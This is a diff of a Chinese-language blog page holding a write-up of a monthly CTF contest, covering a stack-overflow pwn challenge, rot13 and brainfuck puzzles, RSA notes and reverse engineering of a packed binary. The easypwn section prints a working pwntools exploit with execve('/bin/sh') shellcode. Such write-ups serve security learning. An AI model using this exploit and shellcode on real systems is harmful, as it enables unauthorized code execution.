@@ -1,23 +1,32 @@
 <!DOCTYPE html>
 <html lang=en>
-<head><meta name="generator" content="Hexo 3.8.0">
+<head><meta name="generator" content="Hexo 3.9.0">
     <!-- so meta -->
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="window.disqusProxy={           shortname: &apos;blog-tw5j2p4htr&apos;,           username: &apos;1nv0k3r&apos;,           server: &apos;disqus.1nv0k3r.me&apos;,           port: 5509,           adminAvatar: &apos;/avatar">
+    <meta name="description" content="pwneasypwnDownload: pwn) ida打开程序以后可以看见一个很明显的栈溢出 int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  char buf; // [rsp+0h] [rbp-20h]  int v5; // [rsp+1Ch] [rbp-4h]  setvbuf(_bss_sta">
 <meta name="keywords" content="1nv0k3r, blog, pwn, binary, exploit, vuln">
 <meta property="og:type" content="article">
 <meta property="og:title" content="3月月赛">
 <meta property="og:url" content="http://1nv0k3r.me/2019/03/11/3月月赛/index.html">
 <meta property="og:site_name" content="1nv0k3r&#39;s blog">
-<meta property="og:description" content="window.disqusProxy={           shortname: &apos;blog-tw5j2p4htr&apos;,           username: &apos;1nv0k3r&apos;,           server: &apos;disqus.1nv0k3r.me&apos;,           port: 5509,           adminAvatar: &apos;/avatar">
+<meta property="og:description" content="pwneasypwnDownload: pwn) ida打开程序以后可以看见一个很明显的栈溢出 int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  char buf; // [rsp+0h] [rbp-20h]  int v5; // [rsp+1Ch] [rbp-4h]  setvbuf(_bss_sta">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-03-11T02:52:44.566Z">
+<meta property="og:image" content="http://1nv0k3r.me/2019/03/11/3月月赛/1.png">
+<meta property="og:image" content="http://1nv0k3r.me/2019/03/11/3月月赛/1.jpg">
+<meta property="og:image" content="http://1nv0k3r.me/2019/03/11/3月月赛/2.jpg">
+<meta property="og:image" content="http://1nv0k3r.me/2019/03/11/3月月赛/2.png">
+<meta property="og:image" content="http://1nv0k3r.me/2019/03/11/3月月赛/3.jpg">
+<meta property="og:image" content="http://1nv0k3r.me/2019/03/11/3月月赛/4.jpg">
+<meta property="og:image" content="http://1nv0k3r.me/2019/03/11/3月月赛/5.jpg">
+<meta property="og:image" content="http://1nv0k3r.me/2019/03/11/3月月赛/6.jpg">
+<meta property="og:updated_time" content="2019-03-12T09:52:06.182Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="3月月赛">
-<meta name="twitter:description" content="window.disqusProxy={           shortname: &apos;blog-tw5j2p4htr&apos;,           username: &apos;1nv0k3r&apos;,           server: &apos;disqus.1nv0k3r.me&apos;,           port: 5509,           adminAvatar: &apos;/avatar">
+<meta name="twitter:description" content="pwneasypwnDownload: pwn) ida打开程序以后可以看见一个很明显的栈溢出 int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  char buf; // [rsp+0h] [rbp-20h]  int v5; // [rsp+1Ch] [rbp-4h]  setvbuf(_bss_sta">
+<meta name="twitter:image" content="http://1nv0k3r.me/2019/03/11/3月月赛/1.png">
     
     
         
@@ -69,9 +78,11 @@
         
       </ul>
     </span>
-    <br>
+    <br/>
     <span id="actions">
       <ul>
+        
+        <li><a class="icon" href="/2019/03/12/看雪ctf-2019/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" href="/2019/03/06/unlink宏的实现机制/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -84,7 +95,7 @@
       <span id="i-top" class="info" style="display:none;">Back to top</span>
       <span id="i-share" class="info" style="display:none;">Share post</span>
     </span>
-    <br>
+    <br/>
     <div id="share" style="display: none">
       <ul>
   <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.me/2019/03/11/3月月赛/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
@@ -101,7 +112,7 @@
 
     </div>
     <div id="toc">
-      
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">1.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easypwn"><span class="toc-number">1.1.</span> <span class="toc-text">easypwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strongbox"><span class="toc-number">1.2.</span> <span class="toc-text">strongbox</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn-Android"><span class="toc-number">1.3.</span> <span class="toc-text">pwn_Android</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Journey2urBF"><span class="toc-number">2.1.</span> <span class="toc-text">Journey2urBF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">3.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Just-RSA"><span class="toc-number">3.1.</span> <span class="toc-text">Just RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto-1"><span class="toc-number">3.2.</span> <span class="toc-text">crypto</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ppc"><span class="toc-number">4.</span> <span class="toc-text">ppc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#find-the-different-number"><span class="toc-number">4.1.</span> <span class="toc-text">find the different number</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re"><span class="toc-number">5.</span> <span class="toc-text">re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#collision"><span class="toc-number">5.1.</span> <span class="toc-text">collision</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dice"><span class="toc-number">5.2.</span> <span class="toc-text">dice</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-unpack"><span class="toc-number">5.3.</span> <span class="toc-text">simple unpack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">6.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#funcexecutor"><span class="toc-number">6.1.</span> <span class="toc-text">funcexecutor</span></a></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -109,7 +120,7 @@
     
     <div class="content index py4">
         
-        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
   <header>
     
     <h1 class="posttitle" itemprop="name headline">
@@ -119,7 +130,7 @@
 
 
     <div class="meta">
-      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
         <span itemprop="name">1nv0k3r's blog</span>
       </span>
       
@@ -140,32 +151,150 @@
   
 
   <div class="content" itemprop="articleBody">
-    
-      <script>
-        window.disqusProxy={
-          shortname: 'blog-tw5j2p4htr',
-          username: '1nv0k3r',
-          server: 'disqus.1nv0k3r.me',
-          port: 5509,
-          adminAvatar: '/avatars/admin-avatar.jpg',
-          identifier: '2019/03/11/3月月赛/',
-        };
-        window.disqus_config = function () {
-          this.page.url = window.location.href;
-          this.page.identifier = window.disqusProxy.identifier;
-        };
-      </script>
+    <h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h3><p>Download: <a href="https://github.com/Inv0k3r/pwnable_files/raw/master/pwn%20(2">pwn</a>)</p>
+<p>ida打开程序以后可以看见一个很明显的栈溢出</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Please Select:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1.Listen something."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2.Speak something to me."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"3.ESC"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%ld\n"</span>, &amp;buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Bye~~"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输入2的时候读取了0x40 byte数据但是只有0x20的空间, 可以劫持到EIP</p>
+<p>看一下保护</p>
+<pre><code>➜  Desktop checksec pwn
+[*] &apos;/home/a/Desktop/pwn&apos;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+</code></pre><p>开了PIE, 但是没有开NX, 可以把shellcode写到栈上跳转上去执行</p>
+<p>但是开了pie, 栈地址是随机化的, 我们可以用选项1来leak栈地址</p>
+<p>在gdb里看一下printf的地址</p>
+<pre><code>pwndbg&gt; 
+140737488346288
+</code></pre><p>即 0x7fffffffdcb0</p>
+<p>看一下输入数据的地址</p>
+<pre><code>00:0000│ rsi rsp  0x7fffffffdcb0 ◂— &apos;23333333\nPUUUU&apos;
+01:0008│          0x7fffffffdcb8 —▸ 0x55555555500a (_init+10) ◂— add    byte ptr [rax - 0x7b], cl
+02:0010│          0x7fffffffdcc0 —▸ 0x7fffffffddb0 ◂— 0x1
+03:0018│          0x7fffffffdcc8 ◂— 0x200000000
+04:0020│ rbp      0x7fffffffdcd0 —▸ 0x555555555320 (__libc_csu_init) ◂— push   r15
+05:0028│          0x7fffffffdcd8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
+06:0030│          0x7fffffffdce0 ◂— 0x1
+07:0038│          0x7fffffffdce8 —▸ 0x7fffffffddb8 —▸ 0x7fffffffe17e ◂— 0x2f612f656d6f682f (&apos;/home/a/&apos;)
+</code></pre><p>可以看到输入的数据的地址正好是之前输出的栈地址</p>
+<p>写入shellcode跳转到这个地址即可</p>
+<p>在exploit-db找了个shellcode, 小于0x40就行</p>
+<pre><code>shellcode = &apos;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&apos;
+</code></pre><p>然后溢出到EIP执行shellcode</p>
+<p>exp:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">'./pwn'</span>)</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">shellcode = <span class="string">'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'3.ESC\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">stack_addr = int(r.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>], <span class="number">10</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'[*] stack addr = '</span> + str(stack_addr))</span><br><span class="line">r.sendlineafter(<span class="string">'3.ESC\n'</span>, <span class="string">'2'</span>)</span><br><span class="line">r.sendline(shellcode + <span class="string">'a'</span> * (<span class="number">0x28</span> - len(shellcode)) + p64(stack_addr))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
+<h3 id="strongbox"><a href="#strongbox" class="headerlink" title="strongbox"></a>strongbox</h3><h3 id="pwn-Android"><a href="#pwn-Android" class="headerlink" title="pwn_Android"></a>pwn_Android</h3><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Journey2urBF"><a href="#Journey2urBF" class="headerlink" title="Journey2urBF"></a>Journey2urBF</h3><p>Download: <a href="https://github.com/Inv0k3r/pwnable_files/blob/master/Journey2urBF%20(1">Journey2urBF</a>.bz2)</p>
+<p>直接cat文件</p>
+<pre><code>00000000: 1s8o 0808 s474 7s5p 0003 666p 6167 0085  .....g.\..synt..
+00000010: 91oo 1180 300p 437o 56q1 2513 s8op 08p7  ....0.P{I.%.....
+00000020: sr6o 6011 p740 or2r 12r9 49o8 0840 9953  .x`..@....V..@.F
+00000030: 1550 2n2q p0ns 8ss8 p9p6 7476 0086 6802  .C*-......gi..u.
+00000040: n778 112p n34q 0848 33r9 529o p4p9 3rr1  .k.,.Z.U3.E...&gt;.
+00000050: 2q35 2846 78p4 s511 3sq9 98pr 0rp0 104q  -5(Sk...?......Z
+00000060: r014 2s82 65o4 09o7 o115 qr47 no23 001s  ../.r......T.#..
+00000070: q04r n174 p81r 98s0 5553 38qo nsn5 24ps  .A.g....HF8...$.
+00000080: 22s8 p670 5pr3 7sn6 7r5r 53r6 n996 72q4  &quot;..c\...~^F...e.
+00000090: 9rqr 7103 spp1 114p rs02 0000            ..d....Y....
+
+Congratulations! You have found the flag! But it seems that it&apos;s 
+broken.All lowercase (a-z) and uppercase (A-Z) letters have been
+rotated by 13 positions,can you repair it?  
+
+Hint:The flag was expressed in an ugly programming language,try 
+to solve it.
+</code></pre><p>根据提示猜测是rot 13, 找个在线解密</p>
+<pre><code>00000000: 1f8b 0808 f474 7f5c 0003 666c 6167 0085  .....t.\..flag..
+00000010: 91bb 1180 300c 437b 56d1 2513 f8bc 08c7  ....0.C{V.%.....
+00000020: fe6b 6011 c740 be2e 12e9 49b8 0840 9953  .k`..@....I..@.S
+00000030: 1550 2a2d c0af 8ff8 c9c6 7476 0086 6802  .P*-......tv..h.
+00000040: a778 112c a34d 0848 33e9 529b c4c9 3ee1  .x.,.M.H3.R...&gt;.
+00000050: 2d35 2846 78c4 f511 3fd9 98ce 0ec0 104d  -5(Fx...?......M
+00000060: e014 2f82 65b4 09b7 b115 de47 ab23 001f  ../.e......G.#..
+00000070: d04e a174 c81e 98f0 5553 38db afa5 24cf  .N.t....US8...$.
+00000080: 22f8 c670 5ce3 7fa6 7e5e 53e6 a996 72d4  &quot;..p\...~^S...r.
+00000090: 9ede 7103 fcc1 114c ef02 0000            ..q....L....
+</code></pre><p>看到了flag文件, 文件头1f8b 0808搜了一下是压缩文件, 在010editor中把上面的数据copy进去另存为压缩文件打开</p>
+<p><img src="/2019/03/11/3月月赛/1.png" alt="img"></p>
+<p>brainfuck解两次即可拿到flag</p>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="Just-RSA"><a href="#Just-RSA" class="headerlink" title="Just RSA"></a>Just RSA</h3><p>给了rsa的p, q, e 和加密后的flag</p>
+<p>e=100显然不对</p>
+<p>e与f不互质</p>
+<p>e直接当成25</p>
+<h3 id="crypto-1"><a href="#crypto-1" class="headerlink" title="crypto"></a>crypto</h3><h2 id="ppc"><a href="#ppc" class="headerlink" title="ppc"></a>ppc</h2><h3 id="find-the-different-number"><a href="#find-the-different-number" class="headerlink" title="find the different number"></a>find the different number</h3><p>一堆数字里找一个不同的, 大概就是奇偶, 素数, 大于/小于某个数之类的找规律, 不谈了</p>
+<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h3><p>提示collision..</p>
+<h3 id="dice"><a href="#dice" class="headerlink" title="dice"></a>dice</h3><p>Download: <a href="https://github.com/Inv0k3r/pwnable_files/raw/master/RE_dice.exe">RE_dict.exe</a></p>
+<p>运行程序后, 发现是输入6个数字的key, 如果key正确就输出flag</p>
+<p>ida反编译康康</p>
+<p><img src="/2019/03/11/3月月赛/1.jpg" alt="img"></p>
+<p>六个数字都是分开判断的, 那么我们完全可以用ida的调试进行爆破…</p>
+<p><img src="/2019/03/11/3月月赛/2.jpg" alt="img"></p>
+<p>在判断这里下断点然后从1到6分别输入每一位进行判断即可, 如果正确则会继续往下走 否则跳转到输出wrong</p>
+<p>最后key : 43251</p>
+<h3 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple unpack"></a>simple unpack</h3><p>用detect it easy查壳</p>
+<p>发现是mpress2.19的壳</p>
+<p>找了一圈没找到脱壳工具…尝试手脱</p>
+<p>od打开exe文件</p>
+<p>照着加密与解密的方法, 一路找到程序入口点</p>
+<p>具体来说就是调试外壳程序, 单步调试到一个类似</p>
+<p>  push 40130<br>  retn</p>
+<p>的位置, 即大段的jump操作, 跳转到一个距离当前位置很远的代码</p>
+<p>然后这里的代码可能是</p>
+<p>  0401130   55  db  55  ;     CHAR ‘U’<br>  0401131   8b  db  8b<br>  0401132   ec  db  ec<br>  0401133   6a  db  6a  ;     CHAR ‘j’</p>
+<p>这样的形式</p>
+<p>按下Ctrl + A强迫OD重新分析代码, 即可得到去壳后的程序</p>
+<p><img src="/2019/03/11/3月月赛/2.png" alt="img"></p>
+<p>然后把去壳后的程序dump出来</p>
+<p>在入口点那里右键, 用od脱壳调试进程, 保存即可</p>
+<p>用ida打开以后就可以看到脱壳后的代码了</p>
+<p>程序逻辑是 对输入的数据进行了一波操作, 然后跟一组数据比对</p>
+<p>第一个操作函数, 根据我多(bu)年(cun)逆(zai)向(de)的经验来看是base64算法</p>
+<p><img src="/2019/03/11/3月月赛/3.jpg" alt="img"></p>
+<p>2333, 实际上是根据代码里的几个等于号猜测是base64算法</p>
+<p>那么我们测试一下输入test12345, 找个在线加密的网站 结果是dGVzdDEyMzQ1</p>
+<p>看一下返回的result</p>
+<p><img src="/2019/03/11/3月月赛/4.jpg" alt="img"></p>
+<p>确定是base64</p>
+<p>接下来两个函数对base64的结果操作了一波</p>
+<p>函数1:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401160</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      a1[HIDWORD(v1)] = (a1[HIDWORD(v1)] + <span class="number">6</span>) ^ <span class="number">6</span>;</span><br><span class="line">      LODWORD(v1) = <span class="number">0</span>;</span><br><span class="line">      ++HIDWORD(v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( HIDWORD(v1) &lt; <span class="built_in">strlen</span>(a1) );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>即对每一位进行+6^6操作</p>
+<p>测一下我们base64串的第一位和第二位操作以后的结果</p>
+<pre><code>&gt;&gt;&gt; print ord(&apos;d&apos;) + 6 ^ 6
+108
+&gt;&gt;&gt; print chr(108)
+l
+&gt;&gt;&gt; print ord(&apos;G&apos;) + 6 ^ 6
+75
+&gt;&gt;&gt; print chr(75)
+K
+</code></pre><p>和内存中的结果正好一致</p>
+<p><img src="/2019/03/11/3月月赛/5.jpg" alt="img"></p>
+<p>函数2:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_4011A0</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      a1[HIDWORD(v1)] ^= BYTE4(v1);</span><br><span class="line">      LODWORD(v1) = <span class="number">0</span>;</span><br><span class="line">      ++HIDWORD(v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( HIDWORD(v1) &lt; <span class="built_in">strlen</span>(a1) );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>函数2是和自己下标求异或</p>
+<p>测试一下前两位:</p>
+<pre><code>&gt;&gt;&gt; print chr(108 ^ 0)
+l
+&gt;&gt;&gt; print chr(75 ^ 1)
+J
+</code></pre><p>看一下返回结果:</p>
+<p><img src="/2019/03/11/3月月赛/6.jpg" alt="img"></p>
+<p>bingo</p>
+<p>最后一个比对函数, 往内存中输入32位数据, 然后对之前操作完的输入进行比对</p>
+<p>那么程序最终逻辑就是, 输入的key经过base64后, 先逐字符加6异或6, 然后逐字符异或下标, 得到的32位进行比对</p>
+<p>逆向算法即, 对比对的32位逐字符异或下标, 然后异或6后减6, base64解码即可</p>
+<p>32位数据位\x61\x4B\x58\x6B\x6A\x72\x6E\x36\x51\x52\x37\x61\x55\x3D\x44\x72\x48\x2E\x5C\x7B\x49\x93\x4C\x7D\x7E\x28\x4C\x73\x7A\x56\x43\x23</p>
+<p>jio本:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmp = <span class="string">'\x61\x4B\x58\x6B\x6A\x72\x6E\x36\x51\x52\x37\x61\x55\x3D\x44\x72\x48\x2E\x5C\x7B\x49\x93\x4C\x7D\x7E\x28\x4C\x73\x7A\x56\x43\x23'</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">decrypt = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cmp:</span><br><span class="line">    decrypt += chr(((ord(i) ^ num) ^ <span class="number">6</span>) - <span class="number">6</span>)</span><br><span class="line">    num = num + <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> decrypt</span><br></pre></td></tr></table></figure></p>
+<p>然后base64解密这个字符串即可~</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="funcexecutor"><a href="#funcexecutor" class="headerlink" title="funcexecutor"></a>funcexecutor</h3><p>nodejs express 反序列化漏洞一把梭</p>
+
   </div>
 </article>
 
     <div class="blog-post-comments">
-        
-      <script src="//cdn.bootcss.com/react/16.0.0/umd/react.production.min.js"></script>
-      <script src="//cdn.bootcss.com/react-dom/16.0.0/umd/react-dom.production.min.js"></script>
-      <script src="//cdn.bootcss.com/fetch/2.0.3/fetch.min.js"></script>
-      <script src="//cdn.jsdelivr.net/npm/blockies-identicon@0.1.0/blockies.min.js"></script>
-      <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
-      <div id="disqus_proxy_thread"><script src="/scripts/hexo-disqus-proxy-primary.js" async></script>
+        <div id="disqus_thread">
             <noscript>Please enable JavaScript to view the comments.</noscript>
         </div>
     </div>
@@ -191,7 +320,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">1.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easypwn"><span class="toc-number">1.1.</span> <span class="toc-text">easypwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strongbox"><span class="toc-number">1.2.</span> <span class="toc-text">strongbox</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn-Android"><span class="toc-number">1.3.</span> <span class="toc-text">pwn_Android</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Journey2urBF"><span class="toc-number">2.1.</span> <span class="toc-text">Journey2urBF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">3.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Just-RSA"><span class="toc-number">3.1.</span> <span class="toc-text">Just RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto-1"><span class="toc-number">3.2.</span> <span class="toc-text">crypto</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ppc"><span class="toc-number">4.</span> <span class="toc-text">ppc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#find-the-different-number"><span class="toc-number">4.1.</span> <span class="toc-text">find the different number</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re"><span class="toc-number">5.</span> <span class="toc-text">re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#collision"><span class="toc-number">5.1.</span> <span class="toc-text">collision</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dice"><span class="toc-number">5.2.</span> <span class="toc-text">dice</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-unpack"><span class="toc-number">5.3.</span> <span class="toc-text">simple unpack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">6.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#funcexecutor"><span class="toc-number">6.1.</span> <span class="toc-text">funcexecutor</span></a></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
